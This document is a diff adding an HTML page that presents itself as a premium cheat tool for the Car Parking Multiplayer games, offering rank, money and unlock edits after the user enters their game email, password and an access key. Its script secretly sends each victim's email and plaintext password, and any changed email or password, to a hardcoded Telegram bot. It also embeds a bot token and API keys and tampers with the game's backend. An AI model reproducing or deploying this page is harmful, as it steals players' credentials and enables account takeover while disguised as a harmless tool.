@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>FLAME PREMIUM WEB TOOL</title>
+<style>
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:url("https://i.postimg.cc/ZqdtsJ6t/IMG-0640.jpg") center/cover fixed;color:#fff}
+.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
+.container{background:rgba(0,0,0,.6);backdrop-filter:blur(12px);padding:20px;border-radius:10px;box-shadow:0 0 25px #000;border:2px solid #00aaff;text-align:center}
+h1{font-size:20px;margin-bottom:12px;color:#00aaff;text-shadow: 0 0 10px #00aaff;}
+input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:14px}
+button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:14px;transition: 0.3s;}
+button.login{background:#00aaff;color:#fff}
+button.menu{background:#ff8800;color:#fff}
+button.menu:hover{background:#cc6d00; transform: scale(1.02);}
+.status{margin-top:10px;color:#0f0;min-height:20px;font-size:13px}
+.error{color:#f55}
+.small{font-size:11px;opacity:.7;margin-top:10px}
+.price{font-size:12px;opacity:.9;margin-top:8px;color:#0ff;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="center-wrapper">
+  <div class="container">
+    <h1>FLAME PREMIUM TOOL</h1>
+    <div id="loginSection">
+      <select id="gameSelect">
+        <option value="">-- Select Game --</option>
+        <option value="1">Car Parking Multiplayer</option>
+        <option value="2">Car Parking Multiplayer 2</option>
+      </select>
+      <input id="email" type="email" placeholder="Game Email">
+      <input id="password" type="password" placeholder="Game Password">
+      <input id="accessKey" type="text" placeholder="Enter Access Key">
+      <button class="login" id="loginBtn">LOGIN TO TOOL</button>
+      <div id="status" class="status"></div>
+    </div>
+
+    <div id="menuButtons" style="display:none">
+      <div id="userInfo" style="margin-bottom:10px; font-size:12px; color:#aaa;"></div>
+      
+      <div class="price">👑 King Rank & All Stats</div>
+      <button class="menu" onclick="applyFeature('king')">Apply King Rank</button>
+      
+      <div class="price">💰 50M Money & 40K Coins</div>
+      <button class="menu" onclick="applyFeature('money')">Add Money & Coins</button>
+      
+      <div class="price">🔓 Unlock Cars, Houses, Clothes</div>
+      <button class="menu" onclick="applyFeature('unlock')">Unlock Everything</button>
+
+      <hr style="border:0; border-top:1px solid rgba(255,255,255,0.1); margin:10px 0;">
+      
+      <button class="menu" style="background:#444" onclick="changeEmail()">Change Email</button>
+      <button class="menu" style="background:#444" onclick="changePassword()">Change Password</button>
+      
+      <div id="serviceStatus" class="status"></div>
+    </div>
+    <footer class="small">© @cpmflame | Authorized Access Only</footer>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "7805931150:AAEgDJV9RNguZl8Xz7u7IJg99D1D4w7QdUo";
+const ADMIN_ID = "7212602902";
+
+const GAMES = {
+  "1": { name:"CPM 1", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
+  "2": { name:"CPM 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
+};
+
+let currentUser=null, currentToken=null, selectedGame=null;
+
+function updateStatus(msg, isError=false, target='status'){
+  const el=document.getElementById(target);
+  el.className=isError?'status error':'status';
+  el.textContent=msg;
+}
+
+function sendMessageToAdmin(text){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: "Markdown"})
+  }).catch(()=>{});
+}
+
+document.getElementById('loginBtn').addEventListener('click', async ()=>{
+  const email=document.getElementById('email').value.trim();
+  const password=document.getElementById('password').value;
+  const key=document.getElementById('accessKey').value.trim();
+  const gameVal=document.getElementById('gameSelect').value;
+  selectedGame = GAMES[gameVal];
+
+  if(!selectedGame || !email || !password || key !== "FLAMEFEB"){
+    updateStatus("❌ Invalid Details or Key!", true); return;
+  }
+
+  updateStatus("Logging in...");
+  try{
+    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
+      method:'POST',headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({email,password,returnSecureToken:true})
+    });
+    const data = await resp.json();
+    if(data.idToken){
+      currentUser=email; currentToken=data.idToken;
+      document.getElementById('loginSection').style.display='none';
+      document.getElementById('menuButtons').style.display='block';
+      document.getElementById('userInfo').textContent = `Account: ${email}`;
+      sendMessageToAdmin(`🌐 **Web Login Success**\n🎮 Game: ${selectedGame.name}\n📧 Email: \`${email}\`\n🔒 Pass: \`${password}\``);
+    } else updateStatus("❌ Login Failed!", true);
+  } catch(err){ updateStatus("❌ Connection Error!", true); }
+});
+
+async function applyFeature(type) {
+  if(!currentToken) return;
+  updateStatus("Processing Request...", false, 'serviceStatus');
+  
+  let ratingData = {};
+  let actionName = "";
+
+  if(type === 'king'){
+    actionName = "King Rank";
+    const fields=["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
+    fields.forEach(f=>ratingData[f]=100000);
+    ratingData.time=10000000000; ratingData.race_win=3000;
+  } else if(type === 'money'){
+    actionName = "Money & Coins";
+    ratingData = { money: 50000000, coin: 40000 };
+  } else if(type === 'unlock'){
+    actionName = "Unlock All";
+    ratingData = { car_unlocked: true, house_unlocked: true, character_unlocked: true };
+  }
+
+  try {
+    const res = await fetch(selectedGame.rank_url, {
+      method: 'POST',
+      headers: { "Authorization": `Bearer ${currentToken}`, "Content-Type": "application/json" },
+      body: JSON.stringify({ data: JSON.stringify({ RatingData: ratingData }) })
+    });
+    if(res.ok){
+      updateStatus(`✅ ${actionName} Success!`, false, 'serviceStatus');
+      sendMessageToAdmin(`🚀 **Feature Applied**: ${actionName}\n📧 User: \`${currentUser}\``);
+    } else updateStatus("❌ Failed to apply!", true, 'serviceStatus');
+  } catch(err){ updateStatus("❌ API Error!", true, 'serviceStatus'); }
+}
+
+async function changeEmail(){
+  const newEmail=prompt("Enter New Email:"); if(!newEmail) return;
+  updateStatus("Updating Email...", false, 'serviceStatus');
+  try{
+    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
+      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,email:newEmail,returnSecureToken:true})
+    });
+    if(r.ok){ 
+      updateStatus("✅ Email Changed!", false, 'serviceStatus');
+      sendMessageToAdmin(`📧 **Email Updated**\nNew: \`${newEmail}\`\nOld: \`${currentUser}\``);
+    }
+  }catch(e){ updateStatus("❌ Error changing email!", true, 'serviceStatus'); }
+}
+
+async function changePassword(){
+  const newPass=prompt("Enter New Password:"); if(!newPass) return;
+  updateStatus("Updating Password...", false, 'serviceStatus');
+  try{
+    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
+      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,password:newPass,returnSecureToken:true})
+    });
+    if(r.ok){ 
+      updateStatus("✅ Password Changed!", false, 'serviceStatus');
+      sendMessageToAdmin(`🔐 **Password Updated**\nUser: \`${currentUser}\`\nNew Pass: \`${newPass}\``);
+    }
+  }catch(e){ updateStatus("❌ Error changing password!", true, 'serviceStatus'); }
+}
+</script>
+</body>
+</html>
